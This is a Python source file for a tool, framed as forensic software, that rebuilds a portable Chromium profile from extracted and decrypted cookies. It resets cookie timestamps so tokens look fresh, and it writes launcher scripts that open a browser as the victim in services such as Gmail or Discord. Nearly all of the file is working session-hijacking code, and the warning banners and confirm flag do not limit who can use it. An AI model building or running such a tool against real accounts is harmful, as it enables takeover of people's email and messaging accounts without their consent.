import os
import shutil
import sqlite3
import platform
import time
from pathlib import Path

class SessionHijackerTheForge:
    """
    Constructs an authenticated, portable Chromium profile using extracted
    Cookies, LocalStorage, and SessionStorage to allow an investigator
    to seamlessly open a suspect's session (e.g., Gmail, Discord).
    """
    def __init__(self, output_dir, logger_callback=None):
        self.output_dir = Path(output_dir) / "Hijacked_Sessions"
        self.logger_callback = logger_callback

    def log(self, msg):
        if self.logger_callback:
            self.logger_callback(msg)
        else:
            print(msg)

    def _setup_profile_structure(self, session_name):
        base_dir = self.output_dir / session_name
        profile_dir = base_dir / "Default"
        profile_dir.mkdir(parents=True, exist_ok=True)
        
        # Chromium expects Network directory for Cookies
        network_dir = profile_dir / "Network"
        network_dir.mkdir(parents=True, exist_ok=True)
        
        # Local Storage directory
        local_store_dir = profile_dir / "Local Storage" / "leveldb"
        local_store_dir.mkdir(parents=True, exist_ok=True)

        return base_dir, profile_dir, network_dir, local_store_dir

    def detect_installed_browsers(self):
        """
        Detect common Chromium-based and Firefox browser executables on the host.
        Returns a list of absolute paths or executable names that exist on PATH.
        """
        candidates = []
        # Common executable names
        exec_names = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"]
        for name in exec_names:
            path = shutil.which(name)
            if path:
                candidates.append(path)

        # Check common installation locations on Windows
        if platform.system() == "Windows":
            pf = os.environ.get("PROGRAMFILES", "C:\\Program Files")
            pf86 = os.environ.get("PROGRAMFILES(X86)", "C:\\Program Files (x86)")
            local = os.environ.get("LOCALAPPDATA", "")
            probes = [
                os.path.join(pf, "Google", "Chrome", "Application", "chrome.exe"),
                os.path.join(local, "Google", "Chrome", "Application", "chrome.exe"),
                os.path.join(pf, "Microsoft", "Edge", "Application", "msedge.exe"),
                os.path.join(pf86, "Microsoft", "Edge", "Application", "msedge.exe"),
                os.path.join(local, "Programs", "BraveSoftware", "Brave-Browser", "brave.exe"),
                os.path.join(pf, "Mozilla Firefox", "firefox.exe"),
                os.path.join(pf86, "Mozilla Firefox", "firefox.exe"),
            ]
            for p in probes:
                if p and os.path.exists(p) and p not in candidates:
                    candidates.append(p)

        return candidates

    def _inject_cookies(self, cookie_records, network_dir):
        """
        Builds a new Chromium Cookies SQLite database and injects the extracted records.
        Note: If records were encrypted, we inject them back as encrypted (assuming we run 
        the hijacked session on the same host). Or, if decrypted, we inject them as plaintext.
        For wide compatibility, we just recreate the schema and insert exactly what was extracted.
        """
        cookie_db_path = network_dir / "Cookies"
        try:
            conn = sqlite3.connect(cookie_db_path)
            cursor = conn.cursor()
            
            # Chromium 100+ Schema
            cursor.execute('''
            CREATE TABLE cookies (
                creation_utc INTEGER NOT NULL,
                host_key TEXT NOT NULL,
                top_frame_site_key TEXT NOT NULL,
                name TEXT NOT NULL,
                value TEXT NOT NULL,
                encrypted_value BLOB DEFAULT '',
                path TEXT NOT NULL,
                expires_utc INTEGER NOT NULL,
                is_secure INTEGER NOT NULL,
                is_httponly INTEGER NOT NULL,
                last_access_utc INTEGER NOT NULL,
                has_expires INTEGER NOT NULL DEFAULT 1,
                is_persistent INTEGER NOT NULL DEFAULT 1,
                priority INTEGER NOT NULL DEFAULT 1,
                samesite INTEGER NOT NULL DEFAULT -1,
                source_scheme INTEGER NOT NULL DEFAULT 0,
                source_port INTEGER NOT NULL DEFAULT -1,
                is_same_party INTEGER NOT NULL DEFAULT 0,
                last_update_utc INTEGER NOT NULL,
                UNIQUE (host_key, top_frame_site_key, name, path)
            )
            ''')
            
            inserted = 0
            for row in cookie_records:
                # Based on the structure generated in cookies_parser.py
                # This focuses on standard keys. Missing columns get defaults.
                host = str(row.get("Host", ""))
                name = str(row.get("Name", ""))
                val = str(row.get("Value (Decrypted)", "") or row.get("Value", ""))
                # If we have the decrypted value, we put it in the cleartext `value` column 
                # because we are dropping the encryption key in the spoofed profile.
                if host and name:
                    try:
                        # Use current time to ensure tokens don't look expired
                        now_webkit = int((time.time() + 11644473600) * 1000000)
                        cursor.execute('''
                            INSERT OR REPLACE INTO cookies 
                            (creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, last_update_utc)
                            VALUES (?, ?, '', ?, ?, '/', 0, 0, 0, ?, ?)
                        ''', (now_webkit, host, name, val, now_webkit, now_webkit))
                        inserted += 1
                    except sqlite3.Error:
                        continue
            conn.commit()
            conn.close()
            return inserted
        except Exception as e:
            self.log(f"[-] Error injecting cookies into hijacked profile: {e}")
            return 0

    def generate_launcher(self, base_dir, session_name, preferred_browser=None):
        """
        Creates a .bat script (Windows) or .sh (Linux/Mac) to launch an isolated Chromium instance
        pointing specifically at the forged profile. Optionally accepts a preferred browser executable
        path or name which will be used to launch the forged profile.
        """
        is_windows = platform.system() == "Windows"

        # Resolve a usable browser command
        browser_cmd = None
        if preferred_browser:
            browser_cmd = f'"{preferred_browser}"' if os.path.isabs(preferred_browser) else preferred_browser

        if is_windows:
            launcher_path = base_dir / f"Launch_Hijacked_{session_name}.bat"
            if not browser_cmd:
                browser_cmd = "chrome.exe"

            content = f"""@echo off
title FORENSIC SESSION HIJACKER - {session_name}
echo ======================================================================
echo [!] WARNING: AUTHORIZED FORENSIC USE ONLY                         [!]
echo [!] You are about to assume the suspect's authenticated session. [!]
echo [!] Every action you take will be recorded on the target servers.  [!]
echo ======================================================================
echo.
echo [*] Target Session: {session_name}
echo [*] Profile Path: %~dp0
echo.
set /p choice="Do you want to proceed with session hijacking? (y/n): "
if /i "%choice%" neq "y" exit
echo.
echo [*] Launching isolated Chromium instance...
start {browser_cmd} --user-data-dir="%~dp0\\" --no-first-run --no-default-browser-check --disable-sync --disable-background-networking
"""
        else:
            launcher_path = base_dir / f"Launch_Hijacked_{session_name}.sh"
            if not browser_cmd:
                browser_cmd = "google-chrome"

            content = f"""#!/bin/bash
echo "======================================================================"
echo "[!] WARNING: AUTHORIZED FORENSIC USE ONLY                         [!]"
echo "[!] You are about to assume the suspect's authenticated session. [!]"
echo "[!] Every action you take will be recorded on the target servers.  [!]"
echo "======================================================================"
echo ""
echo "[*] Target Session: {session_name}"
echo ""
read -p "Do you want to proceed with session hijacking? (y/n): " choice
if [[ ! $choice =~ ^[Yy]$ ]]; then exit 1; fi
echo ""
echo "[*] Launching isolated Chromium instance..."
{browser_cmd} --user-data-dir="$(pwd)" --no-first-run --no-default-browser-check --disable-sync --disable-background-networking &
"""
        try:
            with open(launcher_path, "w", encoding="utf-8") as f:
                f.write(content)
            if not is_windows:
                os.chmod(launcher_path, 0o755)
            return launcher_path
        except Exception as e:
            self.log(f"[-] Failed to generate launcher script: {e}")
            return None

    def create_hijacked_session(self, session_name, cookie_records, confirm=False):
        """
        High-level orchestrator to build the profile and inject artifacts.
        """
        if not cookie_records:
            return False

        # Programmatic safety: require explicit confirmation flag before creating hijacked profiles
        if not confirm:
            self.log("[-] Session hijacking requires explicit confirmation. Pass confirm=True to proceed.")
            return False

        # Detect available browsers on the host to inform the investigator
        detected = self.detect_installed_browsers()
        if not detected:
            self.log("[-] No supported browser executables detected on this host. Aborting hijack generation.")
            return False
        else:
            self.log(f"[!] Detected browser executables: {detected}")

        self.log(f"\n[*] Generating Cryptographic Hijacked Session: {session_name}")
        base_dir, profile_dir, network_dir, local_store_dir = self._setup_profile_structure(session_name)
        
        # 1. Inject Cookies
        count = self._inject_cookies(cookie_records, network_dir)
        self.log(f"    -> Injected {count} authentication tokens (Cookies).")
        
        # 2. Generate Launcher Script (prefer first detected browser)
        preferred = detected[0] if detected else None
        launcher = self.generate_launcher(base_dir, session_name, preferred_browser=preferred)
        
        if launcher and count > 0:
            self.log(f"    [+] Session Hijack Container created at: {base_dir}")
            self.log(f"    [!] Run {launcher.name} to acquire target session.")
            return True
        else:
            self.log("    [-] Insufficient data or permissions to create session container.")
            return False
